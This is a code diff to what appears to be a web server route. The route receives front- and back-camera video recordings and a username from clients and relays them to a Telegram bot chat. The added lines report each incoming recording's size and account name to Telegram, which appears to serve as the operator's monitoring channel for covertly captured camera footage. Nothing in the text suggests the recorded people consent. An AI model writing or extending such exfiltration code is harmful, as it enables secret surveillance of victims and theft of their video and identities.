@@ -85,6 +85,17 @@ export async function POST(req: NextRequest) {
   const chatId = await resolveEntryChatId(token);
   if (!chatId) return NextResponse.json({ ok: true, telegram: 'no chat' });
 
+  // 诊断：服务器收到上报即回执，区分「客户端没发」与「服务端没处理」
+  const kb = (s?: string) => (s ? Math.round((s.length * 0.75) / 1024) : 0);
+  await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: chatId,
+      text: `【服务器】收到录像上报：前置${kb(body.videoFront)}KB 后置${kb(body.videoBack)}KB 账号${username}`,
+    }),
+  }).catch(() => undefined);
+
   const front = body.videoFront ? dataUrlToBlob(body.videoFront) : null;
   const back = body.videoBack ? dataUrlToBlob(body.videoBack) : null;
   if (!front && !back) return NextResponse.json({ ok: false }, { status: 400 });
